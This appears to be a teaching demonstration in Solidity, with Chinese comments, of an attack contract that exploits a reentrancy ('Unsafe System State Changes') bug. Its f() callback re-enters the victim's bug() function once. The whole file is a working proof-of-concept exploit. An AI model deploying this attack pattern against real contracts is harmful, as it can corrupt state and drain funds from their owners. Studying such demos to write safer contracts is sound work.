// 攻擊合約示範：
// 此攻擊合約模擬利用 Unsafe System State Changes 漏洞
// 當受害者合約的 bug() 函式在呼叫外部合約 (d.f()) 期間，再次被 reenter 執行 bug()，造成狀態異常改變

interface IVulnerable {
    function bug(ICalled d) external;
}

interface ICalled {
    function f() external;
}

contract Attack is ICalled {
    IVulnerable public vulnerable;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 1; // 限制重入次數，避免無限遞迴

    // 攻擊合約在部屬時傳入脆弱合約地址
    constructor(address _vulnerable) public {
        vulnerable = IVulnerable(_vulnerable);
    }

    // 攻擊入口
    function attack() external {
        vulnerable.bug(ICalled(address(this)));
    }

    // 實作 ICalled.f() ，當脆弱合約在 bug() 中呼叫此函式時觸發
    function f() external override {
        // 判斷是否已達到最大 reentrancy 次數，若未達則再次呼叫 bug() 重入
        if(reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // 再次呼叫脆弱合約的 bug()，模擬重入情境
            vulnerable.bug(ICalled(address(this)));
        }
    }
}
